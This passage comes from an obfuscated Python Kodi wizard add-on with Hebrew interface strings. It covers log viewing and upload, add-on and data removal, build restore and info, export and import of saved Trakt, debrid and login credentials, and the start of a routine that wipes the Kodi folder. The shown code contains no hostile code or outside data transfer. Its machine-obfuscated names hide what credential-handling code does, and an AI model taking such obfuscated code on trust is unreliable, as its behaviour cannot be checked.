ACTION_MOVE_LEFT =1 #line:4946
ACTION_MOVE_RIGHT =2 #line:4947
ACTION_MOVE_UP =3 #line:4948
ACTION_MOVE_DOWN =4 #line:4949
ACTION_MOUSE_WHEEL_UP =104 #line:4950
ACTION_MOUSE_WHEEL_DOWN =105 #line:4951
ACTION_MOVE_MOUSE =107 #line:4952
ACTION_SELECT_ITEM =7 #line:4953
ACTION_BACKSPACE =110 #line:4954
ACTION_MOUSE_LEFT_CLICK =100 #line:4955
ACTION_MOUSE_LONG_CLICK =108 #line:4956
def LogViewer (default =None ):#line:4958
	class O0O000OOO0000000O (xbmcgui .WindowXMLDialog ):#line:4959
		def __init__ (O0O0OO0OO000O0000 ,*O0000O0OOO000000O ,**O0OOOO0O00000OO00 ):#line:4960
			O0O0OO0OO000O0000 .default =O0OOOO0O00000OO00 ['default']#line:4961
		def onInit (O000OO0O00OO000OO ):#line:4963
			O000OO0O00OO000OO .title =101 #line:4964
			O000OO0O00OO000OO .msg =102 #line:4965
			O000OO0O00OO000OO .scrollbar =103 #line:4966
			O000OO0O00OO000OO .upload =201 #line:4967
			O000OO0O00OO000OO .kodi =202 #line:4968
			O000OO0O00OO000OO .kodiold =203 #line:4969
			O000OO0O00OO000OO .wizard =204 #line:4970
			O000OO0O00OO000OO .okbutton =205 #line:4971
			O00O0O00OOO0O00O0 =open (O000OO0O00OO000OO .default ,'r')#line:4972
			O000OO0O00OO000OO .logmsg =O00O0O00OOO0O00O0 .read ()#line:4973
			O00O0O00OOO0O00O0 .close ()#line:4974
			O000OO0O00OO000OO .titlemsg ="%s: %s"%(ADDONTITLE ,O000OO0O00OO000OO .default .replace (LOG ,'').replace (ADDONDATA ,''))#line:4975
			O000OO0O00OO000OO .showdialog ()#line:4976
		def showdialog (O0000OOOOO00O000O ):#line:4978
			O0000OOOOO00O000O .getControl (O0000OOOOO00O000O .title ).setLabel (O0000OOOOO00O000O .titlemsg )#line:4979
			O0000OOOOO00O000O .getControl (O0000OOOOO00O000O .msg ).setText (wiz .highlightText (O0000OOOOO00O000O .logmsg ))#line:4980
			O0000OOOOO00O000O .setFocusId (O0000OOOOO00O000O .scrollbar )#line:4981
		def onClick (OO0O0OOO00O00O0OO ,O0O0O00OO00OO000O ):#line:4983
			if O0O0O00OO00OO000O ==OO0O0OOO00O00O0OO .okbutton :OO0O0OOO00O00O0OO .close ()#line:4984
			elif O0O0O00OO00OO000O ==OO0O0OOO00O00O0OO .upload :OO0O0OOO00O00O0OO .close ();uploadLog .Main ()#line:4985
			elif O0O0O00OO00OO000O ==OO0O0OOO00O00O0OO .kodi :#line:4986
				O000O0OO00O0OOOO0 =wiz .Grab_Log (False )#line:4987
				OOO0O0OO0O00O0O0O =wiz .Grab_Log (True )#line:4988
				if O000O0OO00O0OOOO0 ==False :#line:4989
					OO0O0OOO00O00O0OO .titlemsg ="%s: View Log Error"%ADDONTITLE #line:4990
					OO0O0OOO00O00O0OO .getControl (OO0O0OOO00O00O0OO .msg ).setText ("Log File Does Not Exists!")#line:4991
				else :#line:4992
					OO0O0OOO00O00O0OO .titlemsg ="%s: %s"%(ADDONTITLE ,OOO0O0OO0O00O0O0O .replace (LOG ,''))#line:4993
					OO0O0OOO00O00O0OO .getControl (OO0O0OOO00O00O0OO .title ).setLabel (OO0O0OOO00O00O0OO .titlemsg )#line:4994
					OO0O0OOO00O00O0OO .getControl (OO0O0OOO00O00O0OO .msg ).setText (wiz .highlightText (O000O0OO00O0OOOO0 ))#line:4995
					OO0O0OOO00O00O0OO .setFocusId (OO0O0OOO00O00O0OO .scrollbar )#line:4996
			elif O0O0O00OO00OO000O ==OO0O0OOO00O00O0OO .kodiold :#line:4997
				O000O0OO00O0OOOO0 =wiz .Grab_Log (False ,True )#line:4998
				OOO0O0OO0O00O0O0O =wiz .Grab_Log (True ,True )#line:4999
				if O000O0OO00O0OOOO0 ==False :#line:5000
					OO0O0OOO00O00O0OO .titlemsg ="%s: View Log Error"%ADDONTITLE #line:5001
					OO0O0OOO00O00O0OO .getControl (OO0O0OOO00O00O0OO .msg ).setText ("Log File Does Not Exists!")#line:5002
				else :#line:5003
					OO0O0OOO00O00O0OO .titlemsg ="%s: %s"%(ADDONTITLE ,OOO0O0OO0O00O0O0O .replace (LOG ,''))#line:5004
					OO0O0OOO00O00O0OO .getControl (OO0O0OOO00O00O0OO .title ).setLabel (OO0O0OOO00O00O0OO .titlemsg )#line:5005
					OO0O0OOO00O00O0OO .getControl (OO0O0OOO00O00O0OO .msg ).setText (wiz .highlightText (O000O0OO00O0OOOO0 ))#line:5006
					OO0O0OOO00O00O0OO .setFocusId (OO0O0OOO00O00O0OO .scrollbar )#line:5007
			elif O0O0O00OO00OO000O ==OO0O0OOO00O00O0OO .wizard :#line:5008
				O000O0OO00O0OOOO0 =wiz .Grab_Log (False ,False ,True )#line:5009
				OOO0O0OO0O00O0O0O =wiz .Grab_Log (True ,False ,True )#line:5010
				if O000O0OO00O0OOOO0 ==False :#line:5011
					OO0O0OOO00O00O0OO .titlemsg ="%s: View Log Error"%ADDONTITLE #line:5012
					OO0O0OOO00O00O0OO .getControl (OO0O0OOO00O00O0OO .msg ).setText ("Log File Does Not Exists!")#line:5013
				else :#line:5014
					OO0O0OOO00O00O0OO .titlemsg ="%s: %s"%(ADDONTITLE ,OOO0O0OO0O00O0O0O .replace (ADDONDATA ,''))#line:5015
					OO0O0OOO00O00O0OO .getControl (OO0O0OOO00O00O0OO .title ).setLabel (OO0O0OOO00O00O0OO .titlemsg )#line:5016
					OO0O0OOO00O00O0OO .getControl (OO0O0OOO00O00O0OO .msg ).setText (wiz .highlightText (O000O0OO00O0OOOO0 ))#line:5017
					OO0O0OOO00O00O0OO .setFocusId (OO0O0OOO00O00O0OO .scrollbar )#line:5018
		def onAction (OOO0OOO0O0000O0O0 ,O000000OO0OO00OOO ):#line:5020
			if O000000OO0OO00OOO ==ACTION_PREVIOUS_MENU :OOO0OOO0O0000O0O0 .close ()#line:5021
			elif O000000OO0OO00OOO ==ACTION_NAV_BACK :OOO0OOO0O0000O0O0 .close ()#line:5022
	if default ==None :default =wiz .Grab_Log (True )#line:5023
	OOOOO00OOO00000OO =O0O000OOO0000000O ("LogViewer.xml",ADDON .getAddonInfo ('path'),'DefaultSkin',default =default )#line:5024
	OOOOO00OOO00000OO .doModal ()#line:5025
	del OOOOO00OOO00000OO #line:5026
def removeAddon (OO0O00OOOO0OO00OO ,OO00OOOO00O0OO0OO ,over =False ):#line:5028
	if not over ==False :#line:5029
		OO0OO0O0O0OO0OO00 =1 #line:5030
	else :#line:5031
		OO0OO0O0O0OO0OO00 =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Are you sure you want to delete the addon:'%COLOR2 ,'Name: [COLOR %s]%s[/COLOR]'%(COLOR1 ,OO00OOOO00O0OO0OO ),'ID: [COLOR %s]%s[/COLOR][/COLOR]'%(COLOR1 ,OO0O00OOOO0OO00OO ),yeslabel ='[B][COLOR green]Remove Addon[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]')#line:5032
	if OO0OO0O0O0OO0OO00 ==1 :#line:5033
		OOOOO00OOO0000OO0 =os .path .join (ADDONS ,OO0O00OOOO0OO00OO )#line:5034
		wiz .log ("Removing Addon %s"%OO0O00OOOO0OO00OO )#line:5035
		wiz .cleanHouse (OOOOO00OOO0000OO0 )#line:5036
		xbmc .sleep (1000 )#line:5037
		try :shutil .rmtree (OOOOO00OOO0000OO0 )#line:5038
		except Exception as OOOO00OOO00OOO00O :wiz .log ("Error removing %s"%OO0O00OOOO0OO00OO ,xbmc .LOGNOTICE )#line:5039
		removeAddonData (OO0O00OOOO0OO00OO ,OO00OOOO00O0OO0OO ,over )#line:5040
	if over ==False :#line:5041
		wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]%s Removed[/COLOR]"%(COLOR2 ,OO00OOOO00O0OO0OO ))#line:5042
def removeAddonData (O0OO00OOO00000O0O ,name =None ,over =False ):#line:5044
	if O0OO00OOO00000O0O =='all':#line:5045
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] addon data stored in you Userdata folder?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:5046
			wiz .cleanHouse (ADDOND )#line:5047
		else :wiz .LogNotify ('[COLOR %s]Remove Addon Data[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:5048
	elif O0OO00OOO00000O0O =='uninstalled':#line:5049
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] addon data stored in you Userdata folder for uninstalled addons?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:5050
			O0O0O0O000OOOOOOO =0 #line:5051
			for O0O0000000000O00O in glob .glob (os .path .join (ADDOND ,'*')):#line:5052
				O000OO0O00OOO00O0 =O0O0000000000O00O .replace (ADDOND ,'').replace ('\\','').replace ('/','')#line:5053
				if O000OO0O00OOO00O0 in EXCLUDES :pass #line:5054
				elif os .path .exists (os .path .join (ADDONS ,O000OO0O00OOO00O0 )):pass #line:5055
				else :wiz .cleanHouse (O0O0000000000O00O );O0O0O0O000OOOOOOO +=1 ;wiz .log (O0O0000000000O00O );shutil .rmtree (O0O0000000000O00O )#line:5056
			wiz .LogNotify ('[COLOR %s]Clean up Uninstalled[/COLOR]'%COLOR1 ,'[COLOR %s]%s Folders(s) Removed[/COLOR]'%(COLOR2 ,O0O0O0O000OOOOOOO ))#line:5057
		else :wiz .LogNotify ('[COLOR %s]Remove Addon Data[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:5058
	elif O0OO00OOO00000O0O =='empty':#line:5059
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] empty addon data folders in you Userdata folder?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:5060
			O0O0O0O000OOOOOOO =wiz .emptyfolder (ADDOND )#line:5061
			wiz .LogNotify ('[COLOR %s]Remove Empty Folders[/COLOR]'%COLOR1 ,'[COLOR %s]%s Folders(s) Removed[/COLOR]'%(COLOR2 ,O0O0O0O000OOOOOOO ))#line:5062
		else :wiz .LogNotify ('[COLOR %s]Remove Empty Folders[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:5063
	else :#line:5064
		OO0OO000OOO0O0OO0 =os .path .join (USERDATA ,'addon_data',O0OO00OOO00000O0O )#line:5065
		if O0OO00OOO00000O0O in EXCLUDES :#line:5066
			wiz .LogNotify ("[COLOR %s]Protected Plugin[/COLOR]"%COLOR1 ,"[COLOR %s]Not allowed to remove Addon_Data[/COLOR]"%COLOR2 )#line:5067
		elif os .path .exists (OO0OO000OOO0O0OO0 ):#line:5068
			if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you also like to remove the addon data for:[/COLOR]'%COLOR2 ,'[COLOR %s]%s[/COLOR]'%(COLOR1 ,O0OO00OOO00000O0O ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:5069
				wiz .cleanHouse (OO0OO000OOO0O0OO0 )#line:5070
				try :#line:5071
					shutil .rmtree (OO0OO000OOO0O0OO0 )#line:5072
				except :#line:5073
					wiz .log ("Error deleting: %s"%OO0OO000OOO0O0OO0 )#line:5074
			else :#line:5075
				wiz .log ('Addon data for %s was not removed'%O0OO00OOO00000O0O )#line:5076
	wiz .refresh ()#line:5077
def restoreit (O0O0OO000O0OOOOOO ):#line:5079
	if O0O0OO000O0OOOOOO =='build':#line:5080
		O0000O00000O0OOOO =freshStart ('restore')#line:5081
		if O0000O00000O0OOOO ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Local Restore Cancelled[/COLOR]"%COLOR2 );return #line:5082
	if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary']:#line:5083
		wiz .skinToDefault ()#line:5084
	wiz .restoreLocal (O0O0OO000O0OOOOOO )#line:5085
def restoreextit (OO0OOOO00OOOO0O0O ):#line:5087
	if OO0OOOO00OOOO0O0O =='build':#line:5088
		O0O000O000OOO0000 =freshStart ('restore')#line:5089
		if O0O000O000OOO0000 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]External Restore Cancelled[/COLOR]"%COLOR2 );return #line:5090
	wiz .restoreExternal (OO0OOOO00OOOO0O0O )#line:5091
def buildInfo (OOOOO00O0O0OO0000 ):#line:5093
	if wiz .workingURL (SPEEDFILE )==True :#line:5094
		if wiz .checkBuild (OOOOO00O0O0OO0000 ,'url'):#line:5095
			OOOOO00O0O0OO0000 ,O00OOO0000OOOOOOO ,OO0OOO00OOOO0OOOO ,O00O0O00OO00O00OO ,OO00OO00OO00OOO0O ,OOOO0OO00000O00O0 ,O0O0O0OOO00O000OO ,OO0OO0000O0O0OOO0 ,OOO00OOO0OOOOO000 ,O000O00O00O0OO000 ,O0OO0O00O0000OOOO =wiz .checkBuild (OOOOO00O0O0OO0000 ,'all')#line:5096
			O000O00O00O0OO000 ='Yes'if O000O00O00O0OO000 .lower ()=='yes'else 'No'#line:5097
			OO00O0000OOOO0OO0 ="[COLOR %s]שם הבילד:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,OOOOO00O0O0OO0000 )#line:5098
			OO00O0000OOOO0OO0 +="[COLOR %s]גירסת הבילד:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,O00OOO0000OOOOOOO )#line:5099
			if not OOOO0OO00000O00O0 =="http://":#line:5100
				O0O00OOOOO000OO00 =wiz .themeCount (OOOOO00O0O0OO0000 ,False )#line:5101
				OO00O0000OOOO0OO0 +="[COLOR %s]Build Theme(s):[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,', '.join (O0O00OOOOO000OO00 ))#line:5102
			OO00O0000OOOO0OO0 +="[COLOR %s]קודי גירסה:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,OO00OO00OO00OOO0O )#line:5103
			OO00O0000OOOO0OO0 +="[COLOR %s]Adult Content:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,O000O00O00O0OO000 )#line:5104
			OO00O0000OOOO0OO0 +="[COLOR %s]תאור:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,O0OO0O00O0000OOOO )#line:5105
			wiz .TextBox (ADDONTITLE ,OO00O0000OOOO0OO0 )#line:5106
		else :wiz .log ("Invalid Build Name!")#line:5107
	else :wiz .log ("Build text file not working: %s"%WORKINGURL )#line:5108
def buildVideo (O00000O0O00OOOO0O ):#line:5110
	wiz .log ("DDDDDDDDDDDDDDDDDDDDDDDDD: %s"%wiz .workingURL (SPEEDFILE ))#line:5111
	if wiz .workingURL (SPEEDFILE )==True :#line:5112
		OO0OOOO000OO0OOO0 =wiz .checkBuild (O00000O0O00OOOO0O ,'preview')#line:5113
		wiz .log ("FFFFFFFFFFFFFFFFFFFFFFFFFF: %s"%O00000O0O00OOOO0O )#line:5114
		if OO0OOOO000OO0OOO0 and not OO0OOOO000OO0OOO0 =='http://':playVideo (OO0OOOO000OO0OOO0 )#line:5115
		else :wiz .log ("[%s]Unable to find url for video preview"%O00000O0O00OOOO0O )#line:5116
	else :wiz .log ("Build text file not working: %s"%WORKINGURL )#line:5117
def dependsList (O00O00O0OOOOO00O0 ):#line:5119
	O0OO0O0OO0OO00000 =os .path .join (ADDONS ,O00O00O0OOOOO00O0 ,'addon.xml')#line:5120
	if os .path .exists (O0OO0O0OO0OO00000 ):#line:5121
		O000O0O0OO000OO0O =open (O0OO0O0OO0OO00000 ,mode ='r');O00OOOOO0OOO0O000 =O000O0O0OO000OO0O .read ();O000O0O0OO000OO0O .close ();#line:5122
		O0000OO000OOOO0OO =wiz .parseDOM (O00OOOOO0OOO0O000 ,'import',ret ='addon')#line:5123
		O0O00OOOOO00OO00O =[]#line:5124
		for OOOOO0000000OO00O in O0000OO000OOOO0OO :#line:5125
			if not 'xbmc.python'in OOOOO0000000OO00O :#line:5126
				O0O00OOOOO00OO00O .append (OOOOO0000000OO00O )#line:5127
		return O0O00OOOOO00OO00O #line:5128
	return []#line:5129
def manageSaveData (OOOO0O00OOO0000OO ):#line:5131
	if OOOO0O00OOO0000OO =='import':#line:5132
		O00O0OO00OOO00000 =os .path .join (ADDONDATA ,'temp')#line:5133
		if not os .path .exists (O00O0OO00OOO00000 ):os .makedirs (O00O0OO00OOO00000 )#line:5134
		OOOO0O00O000000OO =DIALOG .browse (1 ,'[COLOR %s]Select the location of the SaveData.zip[/COLOR]'%COLOR2 ,'files','.zip',False ,False ,HOME )#line:5135
		if not OOOO0O00O000000OO .endswith ('.zip'):#line:5136
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Import Data Error![/COLOR]"%(COLOR2 ))#line:5137
			return #line:5138
		O0OOOO000OO000OOO =os .path .join (MYBUILDS ,'SaveData.zip')#line:5139
		O00O0000O00OO000O =xbmcvfs .copy (OOOO0O00O000000OO ,O0OOOO000OO000OOO )#line:5140
		wiz .log ("%s"%str (O00O0000O00OO000O ))#line:5141
		extract .all (xbmc .translatePath (O0OOOO000OO000OOO ),O00O0OO00OOO00000 )#line:5142
		O00O000OOO000OOOO =os .path .join (O00O0OO00OOO00000 ,'trakt')#line:5143
		O00OOOOOOO0O00O0O =os .path .join (O00O0OO00OOO00000 ,'login')#line:5144
		O0000OOO00O00O00O =os .path .join (O00O0OO00OOO00000 ,'debrid')#line:5145
		OOO0O0O0O0O0O0O00 =0 #line:5146
		if os .path .exists (O00O000OOO000OOOO ):#line:5147
			OOO0O0O0O0O0O0O00 +=1 #line:5148
			O0OOOO0O00000O00O =os .listdir (O00O000OOO000OOOO )#line:5149
			if not os .path .exists (traktit .TRAKTFOLD ):os .makedirs (traktit .TRAKTFOLD )#line:5150
			for O0O00O00O0O0O000O in O0OOOO0O00000O00O :#line:5151
				OO0O0O000OO00OOO0 =os .path .join (traktit .TRAKTFOLD ,O0O00O00O0O0O000O )#line:5152
				OO0000000OO0OO0OO =os .path .join (O00O000OOO000OOOO ,O0O00O00O0O0O000O )#line:5153
				if os .path .exists (OO0O0O000OO00OOO0 ):#line:5154
					if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like replace the current [COLOR %s]%s[/COLOR] file?"%(COLOR2 ,COLOR1 ,O0O00O00O0O0O000O ),yeslabel ="[B][COLOR green]Yes Replace[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):continue #line:5155
					else :os .remove (OO0O0O000OO00OOO0 )#line:5156
				shutil .copy (OO0000000OO0OO0OO ,OO0O0O000OO00OOO0 )#line:5157
			traktit .importlist ('all')#line:5158
			traktit .traktIt ('restore','all')#line:5159
		if os .path .exists (O00OOOOOOO0O00O0O ):#line:5160
			OOO0O0O0O0O0O0O00 +=1 #line:5161
			O0OOOO0O00000O00O =os .listdir (O00OOOOOOO0O00O0O )#line:5162
			if not os .path .exists (loginit .LOGINFOLD ):os .makedirs (loginit .LOGINFOLD )#line:5163
			for O0O00O00O0O0O000O in O0OOOO0O00000O00O :#line:5164
				OO0O0O000OO00OOO0 =os .path .join (loginit .LOGINFOLD ,O0O00O00O0O0O000O )#line:5165
				OO0000000OO0OO0OO =os .path .join (O00OOOOOOO0O00O0O ,O0O00O00O0O0O000O )#line:5166
				if os .path .exists (OO0O0O000OO00OOO0 ):#line:5167
					if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like replace the current [COLOR %s]%s[/COLOR] file?"%(COLOR2 ,COLOR1 ,O0O00O00O0O0O000O ),yeslabel ="[B][COLOR green]Yes Replace[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):continue #line:5168
					else :os .remove (OO0O0O000OO00OOO0 )#line:5169
				shutil .copy (OO0000000OO0OO0OO ,OO0O0O000OO00OOO0 )#line:5170
			loginit .importlist ('all')#line:5171
			loginit .loginIt ('restore','all')#line:5172
		if os .path .exists (O0000OOO00O00O00O ):#line:5173
			OOO0O0O0O0O0O0O00 +=1 #line:5174
			O0OOOO0O00000O00O =os .listdir (O0000OOO00O00O00O )#line:5175
			if not os .path .exists (debridit .REALFOLD ):os .makedirs (debridit .REALFOLD )#line:5176
			for O0O00O00O0O0O000O in O0OOOO0O00000O00O :#line:5177
				OO0O0O000OO00OOO0 =os .path .join (debridit .REALFOLD ,O0O00O00O0O0O000O )#line:5178
				OO0000000OO0OO0OO =os .path .join (O0000OOO00O00O00O ,O0O00O00O0O0O000O )#line:5179
				if os .path .exists (OO0O0O000OO00OOO0 ):#line:5180
					if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like replace the current [COLOR %s]%s[/COLOR] file?"%(COLOR2 ,COLOR1 ,O0O00O00O0O0O000O ),yeslabel ="[B][COLOR green]Yes Replace[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):continue #line:5181
					else :os .remove (OO0O0O000OO00OOO0 )#line:5182
				shutil .copy (OO0000000OO0OO0OO ,OO0O0O000OO00OOO0 )#line:5183
			debridit .importlist ('all')#line:5184
			debridit .debridIt ('restore','all')#line:5185
		wiz .cleanHouse (O00O0OO00OOO00000 )#line:5186
		wiz .removeFolder (O00O0OO00OOO00000 )#line:5187
		os .remove (O0OOOO000OO000OOO )#line:5188
		if OOO0O0O0O0O0O0O00 ==0 :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Save Data Import Failed[/COLOR]"%COLOR2 )#line:5189
		else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Save Data Import Complete[/COLOR]"%COLOR2 )#line:5190
	elif OOOO0O00OOO0000OO =='export':#line:5191
		O0OOOO0OOOOOO00O0 =xbmc .translatePath (MYBUILDS )#line:5192
		O0O0O0OOO000O00O0 =[traktit .TRAKTFOLD ,debridit .REALFOLD ,loginit .LOGINFOLD ]#line:5193
		traktit .traktIt ('update','all')#line:5194
		loginit .loginIt ('update','all')#line:5195
		debridit .debridIt ('update','all')#line:5196
		OOOO0O00O000000OO =DIALOG .browse (3 ,'[COLOR %s]Select where you wish to export the savedata zip?[/COLOR]'%COLOR2 ,'files','',False ,True ,HOME )#line:5197
		OOOO0O00O000000OO =xbmc .translatePath (OOOO0O00O000000OO )#line:5198
		OO0O0OO0000OO0OOO =os .path .join (O0OOOO0OOOOOO00O0 ,'SaveData.zip')#line:5199
		O0OO00OO00OO0OOOO =zipfile .ZipFile (OO0O0OO0000OO0OOO ,mode ='w')#line:5200
		for O0OO0O00OOO00OOO0 in O0O0O0OOO000O00O0 :#line:5201
			if os .path .exists (O0OO0O00OOO00OOO0 ):#line:5202
				O0OOOO0O00000O00O =os .listdir (O0OO0O00OOO00OOO0 )#line:5203
				for O0O00OOO0O0OO0O0O in O0OOOO0O00000O00O :#line:5204
					O0OO00OO00OO0OOOO .write (os .path .join (O0OO0O00OOO00OOO0 ,O0O00OOO0O0OO0O0O ),os .path .join (O0OO0O00OOO00OOO0 ,O0O00OOO0O0OO0O0O ).replace (ADDONDATA ,''),zipfile .ZIP_DEFLATED )#line:5205
		O0OO00OO00OO0OOOO .close ()#line:5206
		if OOOO0O00O000000OO ==O0OOOO0OOOOOO00O0 :#line:5207
			DIALOG .ok (ADDONTITLE ,"[COLOR %s]Save data has been backed up to:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,OO0O0OO0000OO0OOO ))#line:5208
		else :#line:5209
			try :#line:5210
				xbmcvfs .copy (OO0O0OO0000OO0OOO ,os .path .join (OOOO0O00O000000OO ,'SaveData.zip'))#line:5211
				DIALOG .ok (ADDONTITLE ,"[COLOR %s]Save data has been backed up to:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,os .path .join (OOOO0O00O000000OO ,'SaveData.zip')))#line:5212
			except :#line:5213
				DIALOG .ok (ADDONTITLE ,"[COLOR %s]Save data has been backed up to:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,OO0O0OO0000OO0OOO ))#line:5214
def freshStart (install =None ,over =False ):#line:5219
	if USERNAME =='':#line:5220
		ADDON .openSettings ()#line:5221
		sys .exit ()#line:5222
	O000O0OOOO000OOO0 =(SPEEDFILE )#line:5223
	(O000O0OOOO000OOO0 )#line:5224
	O0OO0O0O00O00OO00 =(wiz .workingURL (O000O0OOOO000OOO0 ))#line:5225
	(O0OO0O0O00O00OO00 )#line:5226
	if KEEPTRAKT =='true':#line:5227
		traktit .autoUpdate ('all')#line:5228
		wiz .setS ('traktlastsave',str (THREEDAYS ))#line:5229
	if KEEPREAL =='true':#line:5230
		debridit .autoUpdate ('all')#line:5231
		wiz .setS ('debridlastsave',str (THREEDAYS ))#line:5232
	if KEEPLOGIN =='true':#line:5233
		loginit .autoUpdate ('all')#line:5234
		wiz .setS ('loginlastsave',str (THREEDAYS ))#line:5235
	if over ==True :OO0OOO00O000OO00O =1 #line:5236
	elif install =='restore':OO0OOO00O000OO00O =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]בחרת לשחזר את הבילד מקובץ גיבוי קודם"%COLOR2 ,"האם להמשיך?[/COLOR]",nolabel ='[B][COLOR red]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]המשך[/COLOR][/B]')#line:5237
	elif install :OO0OOO00O000OO00O =1 #line:5238
	else :OO0OOO00O000OO00O =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]התקנת הבילד"%COLOR2 ,"קודי אנונימוס?[/COLOR]",nolabel ='[B][COLOR red]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]המשך[/COLOR][/B]')#line:5239
	if OO0OOO00O000OO00O :#line:5240
		if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']:#line:5241
			OOOOO0O0000O0O00O ='skin.confluence'if KODIV <17 else 'skin.estuary'if KODIV <17 else 'skin.anonymous.mod'if KODIV <17 else 'skin.estouchy'if KODIV <17 else 'skin.phenomenal'if KODIV <17 else 'skin.anonymous.nox'if KODIV <17 else 'skin.Premium.mod'#line:5242
			skinSwitch .swapSkins (OOOOO0O0000O0O00O )#line:5245
			O0O0O000OO000O000 =0 #line:5246
			xbmc .sleep (1000 )#line:5247
			while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O0O0O000OO000O000 <150 :#line:5248
				O0O0O000OO000O000 +=1 #line:5249
				xbmc .sleep (1000 )#line:5250
				wiz .ebi ('SendAction(Select)')#line:5251
			if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:5252
				wiz .ebi ('SendClick(11)')#line:5253
			else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנה נקיה: Skin Swap Timed Out![/COLOR]'%COLOR2 );return False #line:5254
			xbmc .sleep (1000 )#line:5255
		if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']:#line:5256
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנה נקיה: Skin Swap Failed![/COLOR]'%COLOR2 )#line:5257
			return #line:5258
		wiz .addonUpdates ('set')#line:5259
		OO0OO0OO00O00O0OO =os .path .abspath (HOME )#line:5260
		DP .create (ADDONTITLE ,"[COLOR %s]מחשב קבצים ותיקיות"%COLOR2 ,'','אנא המתן![/COLOR]')#line:5261
		O0O0O0O00OOO0O0O0 =sum ([len (O0OOO0OOO0OO0000O )for OO0OOO00OOOOOOO0O ,OOOO0O0O0OOOOOOO0 ,O0OOO0OOO0OO0000O in os .walk (OO0OO0OO00O00O0OO )]);OOO0OO0OOO00O0OOO =0 #line:5262
		DP .update (0 ,"[COLOR %s]Gathering Excludes list."%COLOR2 )#line:5263
		EXCLUDES .append ('My_Builds')#line:5264
		EXCLUDES .append ('archive_cache')#line:5265
		EXCLUDES .append ('script.module.requests')#line:5266
		EXCLUDES .append ('myfav.anon')#line:5267
		if KEEPREPOS =='true':#line:5268
			O00000OO0O0000OOO =glob .glob (os .path .join (ADDONS ,'repo*/'))#line:5269
			for OOOOO0OOO000OO00O in O00000OO0O0000OOO :#line:5270
				OOO00OO00O00O0OO0 =os .path .split (OOOOO0OOO000OO00O [:-1 ])[1 ]#line:5271
				if not OOO00OO00O00O0OO0 ==EXCLUDES :#line:5272
					EXCLUDES .append (OOO00OO00O00O0OO0 )#line:5273
		if KEEPSUPER =='true':#line:5274
			EXCLUDES .append ('plugin.program.super.favourites')#line:5275
		if KEEPMOVIELIST =='true':#line:5276
